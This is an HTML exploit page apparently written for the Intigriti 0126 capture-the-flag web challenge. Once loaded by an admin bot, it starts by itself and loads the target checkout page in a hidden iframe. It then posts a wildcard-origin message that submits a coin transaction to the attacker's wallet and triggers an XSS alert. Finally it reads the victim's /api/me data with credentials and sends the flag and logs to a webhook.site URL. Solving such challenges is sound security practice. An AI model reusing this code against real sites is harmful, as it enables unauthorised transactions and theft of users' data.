<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 0126 - Final Exploit</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
        h1 { color: #0f0; text-align: center; }
        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 11px; max-height: 400px; overflow-y: auto; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .info { color: #0ff; }
        .warning { color: #ff0; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>ðŸŽ¯ Intigriti Challenge 0126</h1>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/8b582371-dd82-47ba-81e7-9c99b117e80f';
        const CURRENCY = '1337COIN';
        const AMOUNT = 1;

        let step = 0;

        function log(msg, type = 'info', data = {}) {
            step++;
            const ts = new Date().toLocaleTimeString();
            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg} ${JSON.stringify(data)}</div>`;
            console.log(`[${step}] ${msg}`, data);

            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'no-cors',
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    step: step,
                    message: msg,
                    type: type,
                    data: data
                })
            }).catch(() => {});
        }

        // Non-blocking alert
        function triggerAlert() {
            setTimeout(() => {
                try {
                    alert('gigawatz');
                    log('âœ… XSS alert triggered!', 'success');
                } catch(e) {
                    log('Alert error:', 'error', { error: e.message });
                }
            }, 100);
        }

        async function exploit() {
            log('ðŸš€ EXPLOIT START', 'info');
            log('Target wallet:', 'info', { wallet: OUR_WALLET });

            try {
                // STEP 1: Create and load iframe
                log('Creating iframe to checkout.html...', 'info');
                const iframe = document.createElement('iframe');
                iframe.id = 'checkoutIframe';
                iframe.style.display = 'none';
                iframe.src = `${TARGET}/checkout.html?currency=${CURRENCY}&price=1`;
                document.body.appendChild(iframe);
                log('Iframe created:', 'info', { src: iframe.src });

                // STEP 2: Wait for iframe to FULLY load (extended timing)
                log('Waiting for iframe to initialize (10s)...', 'warning');

                await new Promise(resolve => {
                    let loaded = false;

                    iframe.onload = () => {
                        loaded = true;
                        log('iframe.onload fired', 'success');
                        // Additional wait for init() to complete
                        setTimeout(resolve, 5000); // 5s after onload
                    };

                    // Max 10s total wait
                    setTimeout(() => {
                        if (!loaded) {
                            log('iframe.onload timeout - using fallback', 'warning');
                        }
                        resolve();
                    }, 10000);
                });

                log('Iframe should be ready now', 'info');

                // STEP 3: Verify iframe is accessible
                if (!iframe.contentWindow) {
                    log('âŒ Cannot access iframe.contentWindow!', 'error');
                    return;
                }
                log('Iframe contentWindow accessible', 'success');

                // STEP 4: Additional wait for loadWallets() async operation
                log('Waiting 5 more seconds for loadWallets() to complete...', 'info');
                await new Promise(r => setTimeout(r, 5000));

                // STEP 5: Send postMessage
                log('ðŸ“¡ SENDING postMessage...', 'warning');
                log('Message:', 'info', {
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: OUR_WALLET,
                        currency: CURRENCY,
                        amount: AMOUNT
                    }
                });

                try {
                    iframe.contentWindow.postMessage({
                        type: 'submitTransaction',
                        transaction: {
                            toAddress: OUR_WALLET,
                            currency: CURRENCY,
                            amount: AMOUNT
                        }
                    }, '*');
                    log('âœ… postMessage sent!', 'success');
                } catch (e) {
                    log('âŒ postMessage failed:', 'error', { error: e.message });
                    return;
                }

                // STEP 6: Trigger XSS alert (non-blocking)
                log('Triggering XSS alert...', 'info');
                triggerAlert();

                // STEP 7: Wait and check for flag multiple times
                log('Waiting for transaction (10s)...', 'info');
                await new Promise(r => setTimeout(r, 10000));

                for (let i = 0; i < 5; i++) {
                    log(`Flag check ${i+1}/5...`, 'info');
                    const found = await checkFlag();
                    if (found) {
                        log('ðŸ† FLAG FOUND - Stopping checks', 'success');
                        break;
                    }
                    await new Promise(r => setTimeout(r, 3000));
                }

                log('Exploit execution complete', 'info');
                log('Check webhook for full details', 'info');

            } catch (error) {
                log('âŒ ERROR:', 'error', { error: error.message, stack: error.stack });
            }
        }

        async function checkFlag() {
            try {
                const response = await fetch(`${TARGET}/api/me`, {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json' }
                });

                const data = await response.json();

                log('API /me response:', 'info', {
                    status: response.status,
                    hasFlag: !!data.flag,
                    flag: data.flag || 'none'
                });

                if (data.flag) {
                    log('ðŸ†ðŸ†ðŸ† FLAG FOUND: ' + data.flag + ' ðŸ†ðŸ†ðŸ†', 'success');

                    // Send flag to webhook
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        mode: 'no-cors',
                        body: JSON.stringify({
                            timestamp: new Date().toISOString(),
                            flag: data.flag,
                            challenge: 'intigriti-0126',
                            wallet: OUR_WALLET
                        })
                    }).catch(() => {});

                    // Also alert with flag
                    setTimeout(() => alert('ðŸ† FLAG: ' + data.flag), 200);
                    return true;
                }

                return false;

            } catch (error) {
                log('Flag check error:', 'error', { error: error.message });
                return false;
            }
        }

        // Auto-start for admin bot
        window.addEventListener('load', () => {
            log('Page loaded - starting exploit...', 'info');
            setTimeout(exploit, 500);
        });
    </script>
</body>
</html>
